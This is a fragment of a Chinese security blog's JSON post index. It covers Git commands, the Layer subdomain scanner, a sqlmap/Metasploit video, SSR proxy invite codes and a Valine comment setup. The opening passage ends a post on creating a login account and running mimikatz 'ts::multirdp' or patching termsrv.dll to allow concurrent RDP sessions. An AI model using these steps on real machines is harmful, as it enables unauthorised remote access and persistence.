class=\"built_in\">Write-Output</span> <span class=\"string\">\"[*] Done\"</span></div><div class=\"line\">        &#125;      </div><div class=\"line\">    &#125;</div><div class=\"line\">    Main</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>新建账号以后，可成功登陆系统<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1flc7rmrqn5j30ii07y0t2.jpg\" alt=\"\"><br>demo:<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1flc7ro2loxg30z50ikx6s.gif\" alt=\"\"><br>当然可以配合这个姿势来实现多用户登陆。</p>\n<p>使用mimikatz.exe,执行ts::multirdp允许多用户远程登录</p>\n<blockquote>\n<p>ps:该方法在系统重启后失效，下次使用需要重新执行命令ts::multirdp,也可通过修改文件termsrv.dll实现永久修改</p>\n</blockquote>\n<p>end</p>\n","categories":[],"tags":[]},{"title":"Git项目管理常用命令","url":"http://www.chabug.org/2017/11/08/Git-command/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>因为博客放到了GitHub上，采用hexo，所以免不了接触git命令。<br>而像我这种健忘的人，今天记得命令，明天就忘了，所以写一篇命令收集的。</p>\n<h1 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h1><ul>\n<li>远程仓库常用命令</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">检出仓库：$ git clone git://github.com/jQuery/jquery.git</div><div class=\"line\">查看远程仓库：$ git remote -v</div><div class=\"line\">添加远程仓库：$ git remote add [name] [url]</div><div class=\"line\">删除远程仓库：$ git remote rm [name]</div><div class=\"line\">修改远程仓库：$ git remote set-url --push [name] [newUrl]</div><div class=\"line\">拉取远程仓库：$ git pull [remoteName] [localBranchName]</div><div class=\"line\">推送远程仓库：$ git push [remoteName] [localBranchName]</div><div class=\"line\">如果想把本地的某个分支test提交到远程仓库，并作为远程仓库的master分支，或者作为另外一个名叫test的分支，如下：</div><div class=\"line\">$git push origin test:master // 提交本地test分支作为远程的master分支</div><div class=\"line\">$git push origin test:test // 提交本地test分支作为远程的test分支</div></pre></td></tr></table></figure>\n<ul>\n<li>分支 (branch) 操作相关命令</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">查看本地分支：$ git branch</div><div class=\"line\">查看远程分支：$ git branch -r</div><div class=\"line\">创建本地分支：$ git branch [name] ----注意新分支创建后不会自动切换为当前分支</div><div class=\"line\">切换分支：$ git checkout [name]</div><div class=\"line\">创建新分支并立即切换到新分支：$ git checkout -b [name]</div><div class=\"line\">删除分支：$ git branch -d [name] ---- -d选项只能删除已经参与了合并的分支，对于未有合并的分支是无法删除的。如果想强制删除一个分支，可以使用-D选项</div><div class=\"line\">合并分支：$ git merge [name] ----将名称为[name]的分支与当前分支合并</div><div class=\"line\">创建远程分支(本地分支push到远程)：$ git push origin [name]</div><div class=\"line\">删除远程分支：$ git push origin :heads/[name] 或 $ gitpush origin :[name]</div><div class=\"line\">*创建空的分支：(执行命令之前记得先提交你当前分支的修改，否则会被强制删干净没得后悔)</div><div class=\"line\">$git symbolic-ref HEAD refs/heads/[name]</div><div class=\"line\">$rm .git/index</div><div class=\"line\">$git clean -fdx</div></pre></td></tr></table></figure>\n<ul>\n<li>版本 (tag) 操作相关命令</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">查看版本：$ git tag</div><div class=\"line\">创建版本：$ git tag [name]</div><div class=\"line\">删除版本：$ git tag -d [name]</div><div class=\"line\">查看远程版本：$ git tag -r</div><div class=\"line\">创建远程版本(本地版本push到远程)：$ git push origin [name]</div><div class=\"line\">删除远程版本：$ git push origin :refs/tags/[name]</div><div class=\"line\">合并远程仓库的tag到本地：$ git pull origin --tags</div><div class=\"line\">上传本地tag到远程仓库：$ git push origin --tags</div><div class=\"line\">创建带注释的tag：$ git tag -a [name] -m &apos;yourMessage&apos;</div></pre></td></tr></table></figure>\n<ul>\n<li>子模块 (submodule) 相关操作命令</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\">添加子模块：$ git submodule add [url] [path]</div><div class=\"line\">如：$git submodule add git://github.com/soberh/ui-libs.git src/main/webapp/ui-libs</div><div class=\"line\"></div><div class=\"line\">初始化子模块：$ git submodule init ----只在首次检出仓库时运行一次就行</div><div class=\"line\">更新子模块：$ git submodule update ----每次更新或切换分支后都需要运行一下</div><div class=\"line\"></div><div class=\"line\">删除子模块：（分4步走哦）</div><div class=\"line\">1) $ git rm --cached [path]</div><div class=\"line\">2) 编辑“.gitmodules”文件，将子模块的相关配置节点删除掉</div><div class=\"line\">3) 编辑“ .git/config”文件，将子模块的相关配置节点删除掉</div><div class=\"line\">4) 手动删除子模块残留的目录</div><div class=\"line\">5）忽略一些文件、文件夹不提交</div><div class=\"line\"></div><div class=\"line\">在仓库根目录下创建名称为“.gitignore”的文件，写入不需要的文件夹名或文件，每个元素占一行即可，如</div><div class=\"line\">target</div><div class=\"line\">bin</div><div class=\"line\">*.db</div></pre></td></tr></table></figure>\n<ul>\n<li>其他常用命令</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div></pre></td><td class=\"code\"><pre><div class=\"line\">git branch 查看本地所有分支</div><div class=\"line\">git status 查看当前状态</div><div class=\"line\">git commit 提交</div><div class=\"line\">git branch -a 查看所有的分支</div><div class=\"line\">git branch -r 查看本地所有分支</div><div class=\"line\">git commit -am &quot;init&quot; 提交并且加注释</div><div class=\"line\">git remote add origin git@192.168.1.119:ndshow</div><div class=\"line\">git push origin master 将文件给推到服务器上</div><div class=\"line\">git remote show origin 显示远程库origin里的资源</div><div class=\"line\">git push origin master:develop</div><div class=\"line\">git push origin master:hb-dev 将本地库与服务器上的库进行关联</div><div class=\"line\">git checkout --track origin/dev 切换到远程dev分支</div><div class=\"line\">git branch -D master develop 删除本地库develop</div><div class=\"line\">git checkout -b dev 建立一个新的本地分支dev</div><div class=\"line\">git merge origin/dev 将分支dev与当前分支进行合并</div><div class=\"line\">git checkout dev 切换到本地dev分支</div><div class=\"line\">git remote show 查看远程库</div><div class=\"line\">git add .</div><div class=\"line\">git rm 文件名(包括路径) 从git中删除指定文件</div><div class=\"line\">git clone git://github.com/schacon/grit.git 从服务器上将代码给拉下来</div><div class=\"line\">git config --list 看所有用户</div><div class=\"line\">git ls-files 看已经被提交的</div><div class=\"line\">git rm [file name] 删除一个文件</div><div class=\"line\">git commit -a 提交当前repos的所有的改变</div><div class=\"line\">git add [file name] 添加一个文件到git index</div><div class=\"line\">git commit -v 当你用－v参数的时候可以看commit的差异</div><div class=\"line\">git commit -m &quot;This is the message describing the commit&quot; 添加commit信息</div><div class=\"line\">git commit -a -a是代表add，把所有的change加到git index里然后再commit</div><div class=\"line\">git commit -a -v 一般提交命令</div><div class=\"line\">git log 看你commit的日志</div><div class=\"line\">git diff 查看尚未暂存的更新</div><div class=\"line\">git rm a.a 移除文件(从暂存区和工作区中删除)</div><div class=\"line\">git rm --cached a.a 移除文件(只从暂存区中删除)</div><div class=\"line\">git commit -m &quot;remove&quot; 移除文件(从Git中删除)</div><div class=\"line\">git rm -f a.a 强行移除修改后文件(从暂存区和工作区中删除)</div><div class=\"line\">git diff --cached 或 $ git diff --staged 查看尚未提交的更新</div><div class=\"line\">git stash push 将文件给push到一个临时空间中</div><div class=\"line\">git stash pop 将文件从临时空间pop下来</div><div class=\"line\">git remote add origin git@github.com:username/Hello-World.git</div><div class=\"line\">git push origin master 将本地项目给提交到服务器中</div><div class=\"line\">git pull 本地与服务器端同步</div><div class=\"line\">git push (远程仓库名) (分支名) 将本地分支推送到服务器上去。</div><div class=\"line\">git push origin serverfix:awesomebranch</div><div class=\"line\">git fetch 相当于是从远程获取最新版本到本地，不会自动merge</div><div class=\"line\">git commit -a -m &quot;log_message&quot; (-a是提交所有改动，-m是加入log信息) 本地修改同步至服务器端 ：</div><div class=\"line\">git branch branch_0.1 master 从主分支master创建branch_0.1分支</div><div class=\"line\">git branch -m branch_0.1 branch_1.0 将branch_0.1重命名为branch_1.0</div><div class=\"line\">git checkout branch_1.0/master 切换到branch_1.0/master分支</div><div class=\"line\">du -hs</div><div class=\"line\">mkdir WebApp</div><div class=\"line\">cd WebApp</div><div class=\"line\">git init</div><div class=\"line\">touch README</div><div class=\"line\">git add README</div><div class=\"line\">git commit -m &apos;first commit&apos;</div><div class=\"line\">git remote add origin git@github.com:daixu/WebApp.git</div><div class=\"line\">git push -u origin master</div></pre></td></tr></table></figure>\n","categories":[],"tags":[]},{"title":"工具收集之Layer4.1子域名挖掘机","url":"http://www.chabug.org/2017/11/08/Layer/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>实在是没啥可写了，收集点渗透测试中所需的几种工具。</p>\n<h1 id=\"程序\"><a href=\"#程序\" class=\"headerlink\" title=\"程序\"></a>程序</h1><p><strong>Layer 子域名挖掘机4.1 全新重构+175万大字典</strong><br>优化详情：</p>\n<ol>\n<li>新起项目，代码全部重写，性能更优更稳定。</li>\n<li>增加子端口探测功能，方便渗透测试。</li>\n<li>增加DNS服务器切换和自定义，目前测试DNSPOD最快，个人测试最快达到了每秒3000+条验证，速度比上个版本增加5–10倍（速度会越跑越快）。</li>\n<li>切换DNS服务器也可以避免进行大量DNS查询的时候影响正常上网。</li>\n<li>对字典权重进行了调整，更容易命中的排在更前。</li>\n<li>增加升级提醒，如果还有下个版本的话，会有提醒。<br>程序下载地址：<a href=\"https://pan.baidu.com/s/1dE4jgTr\" target=\"_blank\" rel=\"external\">https://pan.baidu.com/s/1dE4jgTr</a> 密码: 9f5u<br>源码下载地址：<a href=\"https://pan.baidu.com/s/1qXURfzu\" target=\"_blank\" rel=\"external\">https://pan.baidu.com/s/1qXURfzu</a><br>BTW：我也不知道360这个傻逼为什么会报窃取QQ密码的毒。<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1flasp3oj2mj316g0sq0ul.jpg\" alt=\"\"></li>\n</ol>\n<p><strong>Layer子域名挖掘机4.2纪念版 增加功能</strong></p>\n<ol>\n<li><p>增加获取web服务器信息的功能，如果在渗透过程中，担心软件自动访问web服务器会记录到web日志，可以关闭获取WEB服务器信息功能，但是如果干特别大的坏事，人家还是可以通过运营商的渠道来抓你。</p>\n</li>\n<li><p>增加线程控制，因有不少人反馈，开全速的时候，他们的小电脑会卡死，反正我电脑跑起来妥妥的，所以默认设置为全速。</p>\n</li>\n<li><p>增加右键复制所选项，胖子硬提出的需求。</p>\n</li>\n<li><p>修复了一个线程锁的问题，没修复前会引起程序崩溃。</p>\n</li>\n</ol>\n<p>小TIPS：为了适应不同的分辨率，首次启动设置了全屏，可点击右上角的最大化按钮复位到我截图的这个小窗口。</p>\n<p>程序地址：<a href=\"https://pan.baidu.com/s/1i5NpcJ7\" target=\"_blank\" rel=\"external\">https://pan.baidu.com/s/1i5NpcJ7</a></p>\n<p>源码地址：<a href=\"https://pan.baidu.com/s/1o8qAKYm\" target=\"_blank\" rel=\"external\">https://pan.baidu.com/s/1o8qAKYm</a>  </p>\n<p>作者<a href=\"http://www.cnseay.com/4452/\" target=\"_blank\" rel=\"external\">Seay的博客</a></p>\n","categories":[],"tags":[]},{"title":"sqlmap与msf的亲密接触","url":"http://www.chabug.org/2017/11/08/sqlmap-msf/","content":"<p><strong>以前的视频了，翻出来帮大家涨姿势把。</strong></p>\n<iframe frameborder=\"0\" width=\"800\" height=\"600\" src=\"https://v.qq.com/iframe/player.html?vid=t0544olbhxc&tiny=0&auto=0\" allowfullscreen></iframe>\n","categories":[],"tags":[]},{"title":"已更新邀请码 SSR分享-你的翻墙利器","url":"http://www.chabug.org/2017/11/07/ssr-share/","content":"<h1 id=\"前奏\"><a href=\"#前奏\" class=\"headerlink\" title=\"前奏\"></a>前奏</h1><p>你是不是仍然被国内的网络环境所困扰？看这里！</p>\n<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p><a href=\"https://www.myshenwang.tk\" target=\"_blank\" rel=\"external\">神网加速器 www.myshenwang.tk</a></p>\n<p>注册初始10G每次签到100-1024MB有1新加坡2日本3美国2香港</p>\n<h1 id=\"教程\"><a href=\"#教程\" class=\"headerlink\" title=\"教程\"></a>教程</h1><p><a href=\"https://www.myshenwang.tk/auth/register\" target=\"_blank\" rel=\"external\">注册链接点我</a></p>\n<p>在邀请码一栏填上下面的邀请码，注册成功后登陆使用ssr链接即可。</p>\n<h1 id=\"邀请码\"><a href=\"#邀请码\" class=\"headerlink\" title=\"邀请码\"></a>邀请码</h1><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">序号</th>\n<th style=\"text-align:center\">邀请码</th>\n<th style=\"text-align:center\">状态</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">6289</td>\n<td style=\"text-align:center\">BnKZC2UPwtdkijcZ8mcmLTDHQkw3OUsQ</td>\n<td style=\"text-align:center\">可用</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6305</td>\n<td style=\"text-align:center\">bqfOYHRy3hwMYU4aXHDtFyODzoj3xagh</td>\n<td style=\"text-align:center\">可用</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6304</td>\n<td style=\"text-align:center\">G7GBhz7o3MXriSRBd7rn4rZbalKTmlRL</td>\n<td style=\"text-align:center\">可用</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6303</td>\n<td style=\"text-align:center\">e5ByTbMzPEzzPzMUEDXnM5Lrf4ack5sH</td>\n<td style=\"text-align:center\">可用</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6302</td>\n<td style=\"text-align:center\">yk0ZZAztnYRCcySLK4r5N2TnrCSZeLl0</td>\n<td style=\"text-align:center\">可用</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6294</td>\n<td style=\"text-align:center\">UFx8zln6Rvc4t7ghaIm4e36UHCWh2EfH</td>\n<td style=\"text-align:center\">可用</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6292</td>\n<td style=\"text-align:center\">UU9lg2Pnkij9Ld9dv7vvr4SZofvhiiIB</td>\n<td style=\"text-align:center\">可用</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6291</td>\n<td style=\"text-align:center\">OysGSD2ilb0FJS90NHXHUoXFCQBEuXvp</td>\n<td style=\"text-align:center\">可用</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6290</td>\n<td style=\"text-align:center\">ir3TusS25CgqO4jN2rNSNisN3sSHO6En</td>\n<td style=\"text-align:center\">可用</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">6306</td>\n<td style=\"text-align:center\">4IoEp6HA1F8fJMuY7Yak85abmfgtW96P</td>\n<td style=\"text-align:center\">可用</td>\n</tr>\n</tbody>\n</table>\n<p><strong>使用过哪个请在下方评论，方便你我他。</strong></p>\n<h1 id=\"返利\"><a href=\"#返利\" class=\"headerlink\" title=\"返利\"></a>返利</h1><p>注意！邀请码请给认识的需要的人。<br>邀请有记录，若被邀请的人违反用户协议，您将会有连带责任。<br>邀请码暂时无法购买，请珍惜。</p>\n<p>您每拉一位用户注册，可以获得<code>3G</code>流量奖励；当 TA 充值时还可获得 TA 充值金额的 <code>20 %</code>的提成。</p>\n","categories":[],"tags":[]},{"title":"给fexo主题添加Valine评论系统","url":"http://www.chabug.org/2017/11/05/fexo-valine-comment/","content":"<h1 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h1><p><a href=\"https://github.com/forsigner/fexo\" target=\"_blank\" rel=\"external\">fexo主题</a>是一款我自己感觉特别好看的hexo主题，但是有一点不太完美的地方。</p>\n<p>fexo采用的第三方评论有hypercomments，disqus，多说，网易云跟帖。</p>\n<p>不过hypercomments和disqus对国内的用户不太友好，所以果断放弃。而多说和网易云跟帖倒闭了，让我很无奈。只能自己操刀研究hexo主题，于是就有了这一篇文章。</p>\n<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>Valine是基于Leancloud的极简风评论系统。</p>\n<ul>\n<li>简约，有着极其漂亮的UI设计<a href=\"http://www.chabug.org/2017/11/05/fexo-valine-comment/#comment\">看这里</a></li>\n<li>免费，我还没有掏过钱</li>\n<li>免备案</li>\n<li>极致速度，国内国外速度都很强</li>\n<li>可以免费用邮件通知和数字验证码</li>\n</ul>\n<p>其他请自行体验。</p>\n<h1 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h1><h2 id=\"获取-APP-ID-和-APP-KEY\"><a href=\"#获取-APP-ID-和-APP-KEY\" class=\"headerlink\" title=\"获取 APP ID 和 APP KEY\"></a>获取 <code>APP ID</code> 和 <code>APP KEY</code></h2><ol>\n<li><a href=\"https://leancloud.cn/dashboard/login.html#/signup\" target=\"_blank\" rel=\"external\">点这里注册</a><code>Leancloud</code></li>\n<li><a href=\"https://leancloud.cn/dashboard/applist.html#/newapp\" target=\"_blank\" rel=\"external\">点这里创建应用</a></li>\n<li>选择刚刚创建的<code>应用&gt;设置&gt;选择应用 Key</code>，然后你就能看到你的APP ID和APP KEY了，参考下图：<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl7jwcw91vj30vn0gyq45.jpg\" alt=\"\"></li>\n<li>为了您的数据安全，请填写<code>应用&gt;设置&gt;安全设置中的Web 安全域名</code>，如下图：<br><img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl7jv4hxuij30uj0pcad2.jpg\" alt=\"\"><h2 id=\"页面中的设置\"><a href=\"#页面中的设置\" class=\"headerlink\" title=\"页面中的设置\"></a>页面中的设置</h2>用代码说话<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Valine - A simple comment system based on Leancloud.<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></div><div class=\"line\">    <span class=\"comment\">&lt;!--Leancloud 操作库:--&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//cdn1.lncld.net/static/js/3.0.4/av-min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\">    <span class=\"comment\">&lt;!--Valine 的核心代码库:--&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"./dist/Valine.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"comment\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></div><div class=\"line\"><span class=\"undefined\">        new Valine(&#123;</span></div><div class=\"line\"><span class=\"undefined\">            // AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)</span></div><div class=\"line\"><span class=\"undefined\">            av: AV,</span></div><div class=\"line\"><span class=\"undefined\">            el: '.comment', //</span></div><div class=\"line\"><span class=\"undefined\">            app_id: 'Your APP ID', // 这里填写上面得到的APP ID</span></div><div class=\"line\"><span class=\"undefined\">            app_key: 'Your APP KEY', // 这里填写上面得到的APP KEY</span></div><div class=\"line\"><span class=\"undefined\">            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!' // [v1.0.7 new]留言框占位提示文字</span></div><div class=\"line\"><span class=\"undefined\">        &#125;);</span></div><div class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></div></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"评论数据管理\"><a href=\"#评论数据管理\" class=\"headerlink\" title=\"评论数据管理\"></a>评论数据管理</h2><p>插播一下，关于评论数据管理，请自行登录Leancloud应用管理。<br>具体步骤：<code>登录&gt;选择你创建的应用&gt;存储&gt;选择ClassComment</code>，然后就可以尽情的发挥你的权利啦.</p>\n<h1 id=\"fexo修改\"><a href=\"#fexo修改\" class=\"headerlink\" title=\"fexo修改\"></a>fexo修改</h1><p><a href=\"https://github.com/forsigner/fexo/pull/102/files\" target=\"_blank\" rel=\"external\">参考GitHub add valine comment system</a></p>\n<ol>\n<li><p>主题<code>_config.yml</code>修改</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"># Comment service</div><div class=\"line\"># disqus_shortname: forsigner</div><div class=\"line\"># hypercomments_id: 89821</div><div class=\"line\"># gentie_key: d16a7241e7cd4b389584ed8db2a4e8bc</div><div class=\"line\"></div><div class=\"line\"># Valine comment system  https://valine.js.org</div><div class=\"line\">valine:</div><div class=\"line\">  enable: true # 如果使用valine，请设置改之为true</div><div class=\"line\">  appid:  # your leancloud application appid</div><div class=\"line\">  appkey:  # your leancloud application appkey</div><div class=\"line\">  notify: true # mail notifier</div><div class=\"line\">  verify: true # Verification code</div><div class=\"line\">  placeholder: 看了这么久，来吐槽啊！ # comment box placeholder</div><div class=\"line\">  avatar: mm # gravatar style</div><div class=\"line\">  guest_info: nick,mail,link # custom comment header</div><div class=\"line\">  pageSize: 10 # pagination size</div><div class=\"line\"></div><div class=\"line\"># 注意，多说即将关闭，建议选用上面四个评论系统</div><div class=\"line\"># duoshuo_shortname: forsigner</div></pre></td></tr></table></figure>\n</li>\n<li><p>主题目录下<code>layout/_partial/component/comments.ejs</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"fexo-comments &lt;%= className %&gt;\"</span>&gt;</span></div><div class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">disqus</span>') %&gt;</span></div><div class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">duoshuo</span>') %&gt;</span></div><div class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">gentie</span>') %&gt;</span></div><div class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">hypercomments</span>') %&gt;</span></div><div class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">%-</span> <span class=\"attr\">partial</span>('<span class=\"attr\">valine</span>') %&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>在<code>layout/_partial/component/</code>目录下新建<code>valine.ejs</code></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%</span> <span class=\"attr\">if</span> (<span class=\"attr\">theme.valine.enable</span>)&#123; %&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//cdn1.lncld.net/static/js/3.0.4/av-min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//unpkg.com/valine@latest/dist/Valine.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"comment\"</span> <span class=\"attr\">class</span>=<span class=\"string\">\"vcomment\"</span> &gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span 